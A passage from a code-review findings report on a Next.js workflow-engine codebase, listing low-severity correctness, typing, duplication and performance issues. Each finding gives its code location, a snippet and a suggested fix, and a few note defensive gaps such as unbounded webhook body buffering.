- **Re-verification note:** `JSON.parse(art.meta)` is still unguarded, so one corrupt `meta` row gives an unhandled 500. The row type is still an ad-hoc `Record<string, unknown>` instead of a `lib/db/rows.ts` mapper. Read through the existing `ArtifactRow` mapper (or add one with a safe JSON column parse) via an `ArtifactService.get(id)`.

- **Severity:** Low
- **Category:** Correctness
- **Area:** Area 1 — App/API (app/, loaders/)
- **Source:** APP-24
- **Location:** `app/api/artifacts/[id]/route.ts:14`
- **Problem:** `JSON.parse(art.meta)` is unguarded, so one corrupt row makes the artifact unreadable with an unhandled 500. The neighboring `comments` route guards the same kind of parse (`comments/route.ts:41`). The row type is also `Record<string, unknown>` rather than a `lib/db/rows.ts` mapper.
- **Evidence:**
  ```ts
  return NextResponse.json({ ...art, meta: art.meta ? JSON.parse(art.meta) : null });
  ```
- **Suggested fix:** Add an `Artifact` row mapper in `lib/db/rows.ts` with a safe JSON column parse, and call it through `ArtifactService.get(id)`.
- **Effort:** S

### CR-172 [Low] `GET /api/graph` falls back to a default graph for unknown flow or template ids

- **Status at `abaa007`:** **Open**, fix in [Task 47](review-tasks/47-thin-routes-and-services.md)
- **Current location:** app/api/graph/route.ts:20-25,51-55
- **Re-verification note:** `?flowId=<unknown>` still resolves to null and falls back to `SDLC_TEMPLATE_ID`, and `?templateId=<unknown>` makes `templateStore.graph` return null and falls through to the registry graph. Both return 200 with a plausible but wrong graph. Return 404 when the flow or template isn't found. Drop the null-`template_id` → SDLC fallback too: it only exists for legacy flows, which are out of scope.

- **Severity:** Low
- **Category:** Correctness
- **Area:** Area 1 — App/API (app/, loaders/)
- **Source:** APP-25
- **Location:** `app/api/graph/route.ts:21-56`
- **Problem:** `?flowId=nope` resolves `template_id` to `null`, then falls back to `SDLC_TEMPLATE_ID` and returns the SDLC graph with a 200. `?templateId=nope` makes `templateStore.graph` return null, which falls through to the registry graph. The client renders a plausible but wrong graph instead of an error.
- **Evidence:**
  ```ts
  templateId ?? rows.get(FlowRow, `SELECT * FROM flows WHERE id=?`, flowId ?? "")?.template_id ?? null;
  g = templateStore.graph(tid ?? SDLC_TEMPLATE_ID);
  ```
- **Suggested fix:** Return a 404 when `flowId` or `templateId` is given but not found. Fall back only for flows whose `template_id` is genuinely null (legacy).
- **Effort:** S

### CR-173 [Low] Type escape hatches: double casts, an unchecked downcast, and type imports from a component barrel

- **Status at `abaa007`:** **Open**, fix in [Task 46](review-tasks/46-backend-types-cleanup.md)
- **Current location:** loaders/flows.ts:31; app/api/contracts/route.ts:136-142,156; lib/engine/prompts/prompt-preview.ts:92; app/api/templates/route.ts:15; loaders/templates.ts:21; app/api/tasks/live/route.ts:23
- **Re-verification note:** Every escape hatch is still there. The `as unknown as FlowData` cast and the double structural cast in contracts are unchanged. The unchecked plan-def downcast moved from the prompt route into `PromptPreview` (`as unknown as SubPlanPreviewer`). The `({}) as never` catch, the loader's `NodeRow`/`TemplateRow` import from `@/components/templates`, and the no-op `Omit<…, never>` are all unchanged. Fixes: give `flowEngine.get` a declared return type, expose a typed `DeclarativeNode` interface, replace the downcast with a capability or `instanceof` guard, parse request bodies with Zod, and move the row types to `types/`.

- **Severity:** Low
- **Category:** Code quality
- **Area:** Area 1 — App/API (app/, loaders/)
- **Source:** APP-26
- **Related:** CR-003 (APP-03); CR-155 (UI-13)
- **Location:** `loaders/flows.ts:31`, `app/api/contracts/route.ts:136-142,156`, `app/api/flows/[id]/prompt/route.ts:40`, `app/api/templates/route.ts:15`, `loaders/templates.ts:21`, `app/api/tasks/live/route.ts:23`
- **Problem:**
  - `flowEngine.get(id) as unknown as FlowData` means the client types are not checked against the engine payload.
  - `contracts` casts the declarative instance to an ad-hoc structural type twice.
  - `nodeRegistry.get(...) as PlanNode` is an unchecked downcast.
  - `.catch(() => ({}) as never)` is a type-system hack.
  - A server loader imports `NodeRow`/`TemplateRow` from `@/components/templates`; these types should live in `types/`.
  - `Required<Omit<LiveTaskFilters, never>>` is a no-op `Omit`.
- **Evidence:**
  ```ts
  return flowEngine.get(id) as unknown as FlowData | null;
  const { name, description } = await req.json().catch(() => ({}) as never);
  ```
- **Suggested fix:**
  - Give `flowEngine.get` a declared return type that `types/flow.ts` is derived from, or check it with `satisfies`.
  - Expose a typed `DeclarativeNode` interface from `instantiateDeclarative`.
  - Replace the downcast with an `instanceof PlanNode` guard.
  - Use a Zod parse (APP-03 (CR-003)) instead of the `as never` catch.
  - Move the row types to `types/templates.ts`.
- **Effort:** S

### CR-174 [Low] Six identical error boundaries and three copies of `TableSkeleton`

- **Status at `abaa007`:** **Open**, fix in [Task 52](review-tasks/52-shared-ui-components.md)
- **Current location:** app/error.tsx; app/(workspace)/error.tsx; app/(workspace)/flows/error.tsx; app/(workspace)/settings/error.tsx; app/(workspace)/templates/error.tsx; app/(workspace)/templates/nodes/error.tsx; app/flows/[id]/error.tsx; app/templates/[id]/error.tsx; TableSkeleton in app/(workspace)/flows/loading.tsx:4, app/(workspace)/templates/loading.tsx:4, app/(workspace)/templates/nodes/loading.tsx:4
- **Re-verification note:** There are still eight near-identical error boundaries (they differ only in log tag and message) and three local copies of `TableSkeleton`, and `components/shared/` has neither. Add `components/shared/RouteError.tsx` and `components/shared/TableSkeleton.tsx`, and make each `error.tsx`/`loading.tsx` a thin wrapper around them.

- **Severity:** Low
- **Category:** Code quality
- **Area:** Area 1 — App/API (app/, loaders/)
- **Source:** APP-27
- **Location:** `app/error.tsx:1-38`, `app/(workspace)/error.tsx:1-37`, `app/(workspace)/flows/error.tsx:1-37`, `app/(workspace)/settings/error.tsx:1-37`, `app/(workspace)/templates/error.tsx:1-37`, `app/(workspace)/templates/nodes/error.tsx:1-37` (plus near-identical `app/flows/[id]/error.tsx` and `app/templates/[id]/error.tsx`). `TableSkeleton` appears in `app/(workspace)/flows/loading.tsx:4-25`, `app/(workspace)/templates/loading.tsx:4-30` and `app/(workspace)/templates/nodes/loading.tsx:4-30`.
- **Problem:** The error boundaries differ only in log tag and message. This is the generic-component case §2.4 says belongs in `components/shared/`. Fixes to one copy (accessibility, digest display) will not reach the others.
- **Evidence:**
  ```tsx
  useEffect(() => { console.error("[flows] uncaught error", error); }, [error]);
  ... <Button size="sm" variant="outline" onClick={reset}>Retry</Button>
  ```
- **Suggested fix:** Add a `components/shared/RouteError.tsx` with `{error, reset, message, logTag, backHref?}` props and a `components/shared/TableSkeleton.tsx` with `{rows, columns, withSearch?}` props. Make each `error.tsx`/`loading.tsx` a one-line wrapper around them.
- **Effort:** S

### CR-175 [Low] `tasks/live` keeps its cache in module-level mutable state

- **Status at `abaa007`:** **Open**, fix in [Task 47](review-tasks/47-thin-routes-and-services.md)
- **Current location:** app/api/tasks/live/route.ts:20-25,55-104
- **Re-verification note:** The TTL cache is still module-level mutable state in the route file, so HMR drops it, and the route still owns the cache-key derivation and the stale-on-error policy. Move all of this into a `LiveTaskFeed` service in `lib/engine/tasks/`, created via `processSingleton`, and keep the route to Zod-parsing the filters and calling it.

- **Severity:** Low
- **Category:** Boundaries
- **Area:** Area 1 — App/API (app/, loaders/)
- **Source:** APP-28
- **Related:** CR-059 (ENG-14); CR-215 (DATA-35)
- **Location:** `app/api/tasks/live/route.ts:20-21`
- **Problem:** `const cache = new TtlCache(...)` is module-level mutable state in a route file. §3.1 and §3.3 say to use the `lib/singleton.ts` factory. In dev, HMR re-evaluates the module and drops the cache. The route also owns caching policy (business logic), including the stale-on-error fallback.
- **Evidence:**
  ```ts
  const CACHE_TTL_MS = 60_000;
  const cache = new TtlCache<LiveTask[]>(CACHE_TTL_MS);
  ```
- **Suggested fix:** Add a `LiveTaskFeed` service in `lib/engine/tasks/`, created through `processSingleton`, that owns the cache, the key derivation and the stale fallback. The route parses the filters with Zod and calls `liveTaskFeed.fetch(kind, filters, {fresh})`.
- **Effort:** S

### CR-176 [Low] The hook payload cap is checked after the whole body is buffered, and counts characters instead of bytes

- **Status at `abaa007`:** **Open**, fix in [Task 58](review-tasks/58-security-webhook-auth.md)
- **Current location:** app/api/hooks/[id]/route.ts:35-38
- **Re-verification note:** `await req.text()` still buffers the whole body before the 1 MB check, and it runs before signature verification, so any unauthenticated caller who knows a hook id can make the server buffer arbitrarily large bodies. `raw.length` also still counts UTF-16 code units, not bytes. Reject early on `Content-Length`, then stream-read with a running byte count that aborts past the cap (or at minimum compare `Buffer.byteLength(raw)`).

- **Severity:** Low
- **Category:** Correctness
- **Area:** Area 1 — App/API (app/, loaders/)
- **Source:** APP-29
- **Location:** `app/api/hooks/[id]/route.ts:35-38`
- **Problem:** `await req.text()` reads the entire body into memory before checking `MAX_PAYLOAD_BYTES`, so the cap does not limit memory use. `raw.length` counts UTF-16 code units, not bytes: a 1 MB-character payload of multi-byte text is about 3 MB, yet passes the "1 MB" check.
- **Evidence:**
  ```ts
  const raw = await req.text();
  if (raw.length > MAX_PAYLOAD_BYTES) { ... 413 }
  ```
- **Suggested fix:** Reject early on `Content-Length > MAX`. Then read `req.body` as a stream with a running byte count and abort past the cap, or at least compare `Buffer.byteLength(raw)`.
- **Effort:** S

### CR-177 [Low] Auto-naming in `POST /api/node-templates` can race and fail on the unique key

- **Status at `abaa007`:** **Partly fixed**, fix in [Task 47](review-tasks/47-thin-routes-and-services.md)
- **Current location:** app/api/node-templates/route.ts:22-27,37-48; lib/engine/templates/template-store.ts:571-609,970-972
- **Re-verification note:** The race itself does not reproduce: better-sqlite3 is synchronous and there is no `await` between the `nodeTemplateByKey` check and `createNodeTemplate`, so in-process requests cannot interleave there. What remains is business logic in the route: auto-naming lives there with its own copy of the slug regex, which must stay in sync with the private `TemplateStore.slugify`, and `body.key` bypasses that check. Move auto-naming into `TemplateStore.createNodeTemplate` (an optional "auto-name" mode), reusing `slugify`.

- **Severity:** Low
- **Category:** Correctness
- **Area:** Area 1 — App/API (app/, loaders/)
- **Source:** APP-30
- **Location:** `app/api/node-templates/route.ts:36-58`
- **Problem:** The route checks `nodeTemplateByKey(slug)` and creates the row later. Two quick palette clicks, for example from a double-click, both pick "Agent node 2", and the second create fails with a unique-key error, which the route returns as a 400. The slug algorithm here must also stay in sync with the store's own key derivation, which lives elsewhere.
- **Evidence:**
  ```ts
  if (!templateStore.nodeTemplateByKey(slug)) { name = candidate; break; }
  ...
  const nt = templateStore.createNodeTemplate({ key: body.key, name, ... });
  ```
- **Suggested fix:** Move auto-naming into `TemplateStore.createNodeTemplate` and run the lookup and insert inside one `db.transaction`, or retry on a unique-constraint error.
- **Effort:** S

### CR-178 [Low] Worktree status lists worktrees once per flow instead of once per repo

- **Status at `abaa007`:** **Open**, fix in [Task 47](review-tasks/47-thin-routes-and-services.md)
- **Current location:** app/api/flows/worktree-status/route.ts:27,55,62-67
- **Re-verification note:** Each flow still calls `worktrees.listWorktrees(repo.local_path)` plus `isWorktreeDirty` and `localBranchState`, all fanned out with an unbounded `Promise.all`, so about 3N git processes run per poll. Group flows by `repo_id`, list each repo's worktrees once, and cap concurrency, inside a `WorktreeStatusService`.

- **Severity:** Low
- **Category:** Code quality
- **Area:** Area 1 — App/API (app/, loaders/)
- **Source:** APP-31
- **Related:** CR-051 (APP-16)
- **Location:** `app/api/flows/worktree-status/route.ts:27,55`
- **Problem:** `statusFor` calls `worktrees.listWorktrees(repo.local_path)` for every flow, and each flow also runs `isWorktreeDirty` and `localBranchState`. With N flows on one repo, every card poll runs about 3N git processes at once (`Promise.all`), with N of them listing the same repo's worktrees. The doc comment says this is "one cheap request".
- **Evidence:**
  ```ts
  const statuses = await Promise.all(rows.map((f) => statusFor(f)));
  ...
  const list = await worktrees.listWorktrees(repo.local_path);
  ```
- **Suggested fix:** Group flows by `repo_id`, list each repo's worktrees once, and limit how many git processes run at a time. Do this inside a `WorktreeStatusService` (see APP-16 (CR-051)).
- **Effort:** S

### CR-179 [Low] The template editor's SSR QueryClient defaults are a hand-copied, already-divergent version of the app provider's

- **Status at `abaa007`:** **Open**, fix in [Task 47](review-tasks/47-thin-routes-and-services.md)
- **Current location:** app/templates/[id]/page.tsx:29-38; app/providers.tsx:12-21
- **Re-verification note:** The SSR QueryClient still hand-copies `staleTime: 30_000` and `refetchOnWindowFocus: false`, and adds `retry: false`, which the client provider doesn't have. Export a `QUERY_CLIENT_DEFAULTS` constant (for example `constants/queryClient.ts`) plus a `makeServerQueryClient()` helper, and use them in both places.

- **Severity:** Low
- **Category:** Code quality
- **Area:** Area 1 — App/API (app/, loaders/)
- **Source:** APP-32
- **Location:** `app/templates/[id]/page.tsx:29-38`, `app/providers.tsx:12-21`
- **Problem:** The comment says the SSR client should "mirror app/providers.tsx", but the values are copied literals (`staleTime: 30_000`) and the server copy adds `retry: false`, which the client does not have. A change to one side will silently make server and client freshness disagree.
- **Evidence:**
  ```ts
  // mirror app/providers.tsx so SSR + client read the same freshness
  staleTime: 30_000, refetchOnWindowFocus: false, retry: false,
  ```
- **Suggested fix:** Export a `QUERY_CLIENT_DEFAULTS` constant from a client-safe module, for example `constants/query-client.ts`, and use it in both places. For SSR, add a `makeServerQueryClient()` helper there.
- **Effort:** S

### CR-180 [Low] Status and flow-kind values are raw string literals throughout the engine

- **Status at `abaa007`:** **Open**, fix in [Task 44](review-tasks/44-engine-stores-and-constants.md)
- **Current location:** lib/engine/flow-engine.ts (58 status literals, e.g. 123,204,301,340-342,1707,1950); lib/engine/runtime/fanout/step-flow-manager.ts (67, e.g. 699,837,855-857,1006-1007,1160-1163,1194); lib/engine/runtime/flow-reconciler.ts (17); lib/engine/runtime/plan-step-store.ts (14, e.g. 161,222-223,260-262); lib/engine/runtime/flow-poller.ts:50
- **Re-verification note:** The engine still uses raw status and flow-kind literals. Only the new `split-manager.ts` uses `FLOW_STATUS` and named status sets. The cited drift still exists: `deletableStepIds` (step-flow-manager.ts:1006-1007) treats `skipped` as not started, while `deletableGuard` (plan-step-store.ts:260-262) treats it as started. Add a server-safe `NODE_STATUS`/`FLOW_KIND` plus named predicate sets (`STARTED`, `TERMINAL_SUCCESS`), as split-manager already does, and use them, starting with the two diverging guards.

- **Severity:** Low
- **Category:** Code quality
- **Area:** Area 2 — Engine core & shared lib
- **Source:** ENG-31
- **Location:** `lib/engine/flow.ts` (41 literal occurrences, for example 249, 768, 942, 1060, 1283, 1328), `lib/engine/step-flows.ts` (61, for example 559, 946-947, 996, 1149-1152), `lib/engine/reconcile.ts` (10), `lib/engine/steps.ts` (14), `lib/engine/poller.ts:51`, `lib/engine/flow.ts:419` (`'step'` kind)
- **Problem:** AGENTS.md section 2.7 requires closed sets as `as const` objects. `constants/flow.ts` already defines `FLOW_STATUS`, but the backend never uses it. The status set is also re-listed inline in several arrays (`["done","approved","failed","skipped"]`, `["running","awaiting_approval","failed","done","approved","skipped"]`), each with slightly different membership. That drift already shows: `deletableStepIds` treats `skipped` as not-started while `PlanStepStore.deletableGuard` treats it as started.
- **Evidence:**
  ```ts
  // step-flows.ts:996
  .some((n) => n.status === "running" || n.status === "awaiting_approval" || n.status === "failed" || n.status === "done" || n.status === "approved");
  // steps.ts:262
  .some((n) => ["running", "awaiting_approval", "failed", "done", "approved", "skipped"].includes(n.status));
  ```
- **Suggested fix:** Add `NODE_STATUS` and `FLOW_KIND` in a server-safe shared constants module (or reuse `constants/flow.ts`). Add named predicate sets (`TERMINAL_SUCCESS`, `STARTED`) and use them everywhere, starting with the two diverging guards.
- **Effort:** M

### CR-181 [Low] Built-in def keys hard-coded as strings despite the "no node-key constants" design and the existing `NODE_KEYS`

- **Status at `abaa007`:** **Partly fixed**, fix in [Task 44](review-tasks/44-engine-stores-and-constants.md)
- **Current location:** lib/engine/templates/template-lint.ts:190,232
- **Re-verification note:** The engine-side literals are gone. Approval ownership now goes through `def.builtinApproval` (flow-engine.ts:1539), the step child template comes from `parentDef.childTemplateId()` (step-flow-manager.ts:421-430), and roles go through `keyOfRole(NODE_KEYS.*)`. Two spots remain in template lint, `nt.key === "plan"` and `["plan","pipeline","review","resolve"].includes(...)`; replace them with `NODE_KEYS.*` or a registry capability query.

- **Severity:** Low
- **Category:** Boundaries
- **Area:** Area 2 — Engine core & shared lib
- **Source:** ENG-32
- **Location:** `lib/engine/flow.ts:619`, `lib/engine/flow.ts:639`, `lib/engine/flow.ts:707`, `lib/engine/flow.ts:748`, `lib/engine/flow.ts:1134`, `lib/engine/flow.ts:1234`, `lib/engine/flow.ts:1331`, `lib/engine/step-flows.ts:421`, `lib/engine/context-lint.ts:189`, `lib/engine/context-lint.ts:231`
- **Problem:** The class doc says roles are "derived from the flow's template graph — no node-key constants here", yet the engine branches on `"plan"`, `"build"`, `"resolve"` and `"pipeline"` literals. `steps.ts` already imports `NODE_KEYS` for the same purpose. This is a string switch where a registry capability (for example `def.capabilities.ownsApproval`, or a role lookup) belongs, per AGENTS.md section 3.2.
- **Evidence:**
  ```ts
  if (defKey === "plan" || defKey === "build") throw new Error(`${nodeKey} approval belongs to its built-in flow actions`);
  ...
  if (parentDefKey === "build") return STEP_BUILD_TEMPLATE_ID;
  ```
- **Suggested fix:** Replace the literals with `NODE_KEYS.*` immediately. Then move the behaviours onto def capabilities (`approvalOwnedByChain`, `stepChildTemplateId`) queried through `nodeRegistry`.
- **Effort:** S

### CR-182 [Low] `any` types in poller, groupEvents, steps, the Jira provider and the SSRF guard

- **Status at `abaa007`:** **Open**, fix in [Task 46](review-tasks/46-backend-types-cleanup.md)
- **Current location:** lib/engine/runtime/flow-poller.ts:50,56,68,106,112,142,150; lib/groupEvents.ts:22,67,288; lib/engine/runtime/plan-step-store.ts:303; lib/engine/tasks/providers/jira.ts:207,239,279,286; lib/net/ssrf-guard.ts:149
- **Re-verification note:** Every cited `any` is still present at the moved paths. They currently show up only as lint warnings, because `lib/` is downgraded to warn. Use the `rows.all(FlowRow/BranchRow, …)` mappers in the poller, a Zod schema for Jira responses, `unknown` plus narrowing in groupEvents and plan-step-store, and the `dns.LookupAddress` callback type in the SSRF lookup.

- **Severity:** Low
- **Category:** Code quality
- **Area:** Area 2 — Engine core & shared lib
- **Source:** ENG-33
- **Related:** CR-003 (APP-03); CR-039 (NODE-44, TOOL-01) — fix CR-039 first: lint will report regressions once installed
- **Location:** `lib/engine/poller.ts:50`, `lib/engine/poller.ts:56`, `lib/engine/poller.ts:68`, `lib/engine/poller.ts:106`, `lib/engine/poller.ts:112`, `lib/engine/poller.ts:142`, `lib/engine/poller.ts:150`, `lib/groupEvents.ts:22`, `lib/groupEvents.ts:67`, `lib/groupEvents.ts:288`, `lib/engine/steps.ts:303`, `lib/engine/tasks/providers/jira.ts:207`, `lib/engine/tasks/providers/jira.ts:239`, `lib/engine/tasks/providers/jira.ts:279`, `lib/engine/tasks/providers/jira.ts:286`, `lib/net/ssrf-guard.ts:149`
- **Problem:** AGENTS.md sections 2.9 and 4 forbid `any`. In the poller, `f: any` hides the fact that `FlowRow`/`BranchRow` mappers exist. `JSON.parse(prev.data).status` on an `any` has no shape check. Jira response parsing is entirely untyped.
- **Evidence:**
  ```ts
  const flows = db.all<any>(`SELECT * FROM flows WHERE status='active' AND ...`);
  private async checkPipeline(f: any, mrIid: number, branchName?: string)
  ```
- **Suggested fix:** Use `rows.all(FlowRow, …)`/`BranchRow` in the poller. Give Jira responses a Zod schema (`z.infer`). Use `unknown` plus narrowing in `groupEvents`/`steps`, and the `dns.LookupAddress` type in the SSRF lookup callback.
- **Effort:** M

### CR-183 [Low] Non-null `!` assertions on data that may be missing

- **Status at `abaa007`:** **Open**, fix in [Task 46](review-tasks/46-backend-types-cleanup.md)
- **Current location:** lib/engine/flow-engine.ts:455,1006; lib/engine/runtime/fanout/step-flow-manager.ts:518,526,538-540,1104,1124; lib/engine/templates/template-store.ts:416,608,700,721,793,815; lib/engine/runtime/hook-store.ts:104; lib/engine/runtime/plan-step-store.ts:73,214; lib/engine/templates/template-lint.ts:195,286
- **Re-verification note:** Non-null assertions after DB reads and filters are still there (`this.nodeTemplate(id)!`, `this.flowTemplate(templateId)!`, `hookForNode(...)!`, `s.childFlowId!`, and others). Narrow with type-guard filters, reuse values already read (the loop at template-store.ts:793/815 re-reads `nt`), and throw a typed `NotFoundError` after DB reads.

- **Severity:** Low
- **Category:** Code quality
- **Area:** Area 2 — Engine core & shared lib
- **Source:** ENG-34
- **Related:** CR-039 (NODE-44, TOOL-01) — fix CR-039 first: lint will report regressions once installed
- **Location:** `lib/engine/flow.ts:362`, `lib/engine/flow.ts:832`, `lib/engine/flow.ts:1237`, `lib/engine/step-flows.ts:508`, `lib/engine/step-flows.ts:516`, `lib/engine/step-flows.ts:528-530`, `lib/engine/step-flows.ts:1094`, `lib/engine/step-flows.ts:1114`, `lib/engine/templates.ts:474`, `lib/engine/templates.ts:666`, `lib/engine/templates.ts:758`, `lib/engine/templates.ts:779`, `lib/engine/templates.ts:851`, `lib/engine/templates.ts:873`, `lib/engine/hooks.ts:104`, `lib/engine/steps.ts:73`, `lib/engine/steps.ts:214`, `lib/engine/context-lint.ts:194`, `lib/engine/context-lint.ts:285`
- **Problem:** AGENTS.md section 3.4 says "No non-null `!` assertions on possibly-missing data". Most of these follow a DB read, where a concurrent delete makes the assertion false (for example `this.nodeTemplate(id)!` after an insert, or `this.flowTemplate(templateId)!`).
- **Evidence:**
  ```ts
  const nt = this.nodeTemplate(n.nodeTemplateId)!;
  ...
  return this.hookForNode(flowId, nodeKey)!;
  ```
- **Suggested fix:** Narrow with type-guard filters (`.filter((s): s is … => …)`). Reuse the value already read (the loop at `templates.ts:848` already fetched `nt`). Throw a typed `NotFoundError` after DB reads.
- **Effort:** S

### CR-184 [Low] Duplicated logic inside `FlowEngine`

- **Status at `abaa007`:** **Open**, fix in [Task 44](review-tasks/44-engine-stores-and-constants.md)
- **Current location:** lib/engine/flow-engine.ts:128-141,206-215,262-271 (node snapshot insert, now 3 copies incl. createSplitChild); 367-379 and 402-415 (run token rollup); 305-306,346-347,1011,1121,1301,1361,1931 and step-flow-manager.ts:632,739 (node-id lookup for events); flow-engine.ts:609+611 (`updated_at` written twice in `bg()`)
- **Re-verification note:** The duplication has grown: the new `createSplitChild` copied the node-snapshot block a third time. Like `createStepChild`, it does not provision `wait_for: webhook` hooks the way `create()` does; it relies on `armNodeWait`'s `ensureForNode` instead. Extract `insertNodeSnapshots(flowId, graph, {provisionHooks})`, `runTokens(r)` and `emitNodeEvent(flowId, key, …)` (or `NodeStore.idOf`), and delete the duplicate `UPDATE flows SET updated_at` in `bg()`'s catch.

- **Severity:** Low
- **Category:** Code quality
- **Area:** Area 2 — Engine core & shared lib
- **Source:** ENG-35
- **Location:** `lib/engine/flow.ts:123-136` and `lib/engine/flow.ts:201-211` (node snapshot insert), `lib/engine/flow.ts:274-286` and `lib/engine/flow.ts:312-323` (run token rollup), `lib/engine/flow.ts:1179-1188`, `lib/engine/flow.ts:1335-1350` and `lib/engine/flow.ts:1374-1389` (downstream attribution and advance), `lib/engine/flow.ts:836-837`, `946-947`, `1097-1098`, `1159-1160`, `1710-1711`, `lib/engine/step-flows.ts:621-622`, `729` (node id lookup for events), `lib/engine/flow.ts:516-519` (`updated_at` written twice)
- **Problem:** The same 5-15-line blocks are copied in several places and have already diverged slightly. For example, `create()` provisions webhook hooks for `wait_for: webhook` nodes, but `createStepChild()` does not, so a step child with a webhook wait has no hook until `armNodeWait`'s `ensureForNode`.
- **Evidence:**
  ```ts
  db.emitEvent(flowId, db.get<{ id: string }>(
    `SELECT id FROM nodes WHERE flow_id=? AND node_key=?`, flowId, k)?.id ?? null,
    "lifecycle", `${k} re-enters via the loop edge — reset to pending`);
  ```
- **Suggested fix:** Extract the following private helpers: `insertNodeSnapshots(flowId, graph)`, `runTokens(r)`, `releaseDownstream(flowId, fromKey)`, and `emitNodeEvent(flowId, key, type, msg, data)` (or `NodeStore.idOf`). Remove the duplicate `UPDATE` in `bg()`.
- **Effort:** S

### CR-185 [Low] `FlowEngine.get()` performs N+1 queries per request

- **Status at `abaa007`:** **Open**, fix in [Task 45](review-tasks/45-flow-engine-decomposition.md)
- **Current location:** lib/engine/flow-engine.ts:358-503 (431,433 per-step child flow + nodes; 467-472 full node_templates scan with linear `find`; 498-500 per-node artifact query incl. `content`; 394 `stepFlows.mergeStates`)
- **Re-verification note:** Unchanged from the reviewed commit. Only child runs are batched (one `IN` query), which was already true before. Each poll still runs two queries per step child and one per-node artifact query that selects full bodies, and searches node templates linearly. Batch child flows, child nodes and artifacts with `IN (...)` and group them in memory, index `ntRows` in a `Map`, and return artifact metadata only, lazy-loading content.

- **Severity:** Low
- **Category:** Code quality
- **Area:** Area 2 — Engine core & shared lib
- **Source:** ENG-36
- **Location:** `lib/engine/flow.ts:333-369`, `lib/engine/flow.ts:388-409`, `lib/engine/flow.ts:375-379`
- **Problem:** The flow detail endpoint, which is polled, runs:
  - 2 queries per step child (child flow and its nodes)
  - 1 artifact query per node, selecting full `content`
  - a full `node_templates` scan, searched linearly per node
  - `stepFlows.mergeStates`, which internally re-runs `statesOf` with further per-step queries
  
  Every poll therefore costs O(steps + nodes) queries plus all artifact bodies.
- **Evidence:**
  ```ts
  const child = rows.get(FlowRow, `SELECT * FROM flows WHERE id=?`, s.sub_flow_id);
  const childNodes = rows.all(NodeRow, `SELECT * FROM nodes WHERE flow_id=? ORDER BY created_at`, s.sub_flow_id);
  ...
  artifacts: rows.all(ArtifactRow, `SELECT ... FROM artifacts WHERE node_id=? ...`, n.id),
  ```
- **Suggested fix:** Batch with `WHERE flow_id IN (...)` / `node_id IN (...)` and group in memory. Index `ntRows` in a `Map`. Return artifact metadata only and lazy-load content.
- **Effort:** M

### CR-186 [Low] `secrets.ts` is a loose-function module holding unrelated responsibilities

- **Status at `abaa007`:** **Open**, fix in [Task 50](review-tasks/50-small-module-cleanups.md)
- **Current location:** lib/engine/secrets.ts:11-39
- **Re-verification note:** Still a loose-function module, `getSecrets`/`redactSecrets`/`httpAllowlist`, reading the plain `settings` table on every call. Convert it to a `SecretStore` class with an injected db (`all()`, `redact()`), move `httpAllowlist` to an `HttpPolicy`/settings service, and flag plaintext-at-rest storage in the PR description.

- **Severity:** Low
- **Category:** Boundaries
- **Area:** Area 2 — Engine core & shared lib
- **Source:** ENG-37
- **Related:** CR-023 (ENG-25, DATA-03); CR-117 (DATA-27); CR-216 (DATA-36)
- **Location:** `lib/engine/secrets.ts:11-39`
- **Problem:** AGENTS.md section 3.1 names `SecretStore` as the expected class, and section 3.5 says three or more cohesive functions become a service with an injected DB. The module also hosts the unrelated HTTP allowlist setting. Secrets are read from the plain `settings` table on every `redactSecrets` call when no map is passed.
- **Evidence:**
  ```ts
  export function getSecrets(): Record<string, string> { ... db.getSetting(...) }
  export function redactSecrets(text: string, secrets?: Record<string, string>): string { ... }
  export function httpAllowlist(): string[] { ... }
  ```
- **Suggested fix:** Create a `SecretStore` class (constructor-injected `db`) with `all()` and `redact()`, and move `httpAllowlist` to an `HttpPolicy`/settings class. Flag the plaintext-at-rest storage in the PR description.
- **Effort:** S

### CR-187 [Low] Dead code and no-ops

- **Status at `abaa007`:** **Fixed** (Task 07 — dead code removed; `RESOLVE_TIMEOUT_MS` wired into DNS lookup)
- **Current location:** lib/engine/runtime/fanout/step-flow-manager.ts:1167-1170 (`latestMergeStatus` unused), 921-926 (node fetched only for presence); lib/engine/runtime/fanout/merge-arena.ts:67-71 (`dropLocks` never called), 245 (`void pushed`); lib/groupEvents.ts:92,273 (`finalizeSection` no-op); lib/engine/flow-engine.ts:437-440 (try/catch that cannot throw); lib/format.ts:51 (unused `n`); lib/engine/tasks/providers/jira.ts:293 (`join(cond ? "" : "")`); lib/net/ssrf-helpers.ts:22 (`RESOLVE_TIMEOUT_MS` unused)
- **Re-verification note:** All cited dead code and no-ops still exist at the moved paths. Delete them, or wire `RESOLVE_TIMEOUT_MS` into the DNS lookup (see CR-189).

- **Severity:** Low
- **Category:** Code quality
- **Area:** Area 2 — Engine core & shared lib
- **Source:** ENG-38
- **Related:** CR-189 (ENG-40)
- **Location:** `lib/engine/step-flows.ts:1158-1160` (`latestMergeStatus` unused), `lib/engine/step-flows.ts:913-914` (node fetched only for its presence), `lib/engine/merge-arena.ts:67-71` (`dropLocks`, documented as never called), `lib/engine/merge-arena.ts:247` (`void pushed`), `lib/groupEvents.ts:91-93`, `lib/groupEvents.ts:273` (`finalizeSection` no-op), `lib/engine/flow.ts:344-347` (try/catch around code that cannot throw), `lib/format.ts:51` (unused `n`), `lib/engine/tasks/providers/jira.ts:293` (`join(cond ? "" : "")`), `lib/net/ssrf-helpers.ts:22` (`RESOLVE_TIMEOUT_MS` unused)
- **Problem:** Unused members and placebo constructs make reviewers think behaviour exists when it does not. For example, `RESOLVE_TIMEOUT_MS` suggests DNS lookups are bounded (see ENG-40 (CR-189)).
- **Evidence:**
  ```ts
  /** No-op pass kept for symmetry/future cleanup (sections are finalized eagerly). */
  private finalizeSection(_s: RunSection): void {}
  ```
- **Suggested fix:** Delete the unused methods and constants, or wire them up (`RESOLVE_TIMEOUT_MS`, see ENG-40 (CR-189)).
- **Effort:** S

### CR-188 [Low] SSRF helper throws `SsrfReason`, not `SsrfError`, so callers see two error types for one policy

- **Status at `abaa007`:** **Open**, fix in [Task 60](review-tasks/60-security-process-and-network-isolation.md)
- **Current location:** lib/net/ssrf-helpers.ts:44,49,56,83-89; lib/net/ssrf-guard.ts:43-48,110-121
- **Re-verification note:** The helpers still throw `SsrfReason`, which `resolveAndCheck` does not catch. Blocked private IPs therefore surface as `SsrfReason`, while scheme and allowlist rejections are `SsrfError`. Nothing outside `lib/net` checks `instanceof` today, so the impact is latent. Move `SsrfError` into a shared `ssrf-error.ts`, throw it from the helpers, and delete `SsrfReason`.

- **Severity:** Low
- **Category:** Code quality
- **Area:** Area 2 — Engine core & shared lib
- **Source:** ENG-39
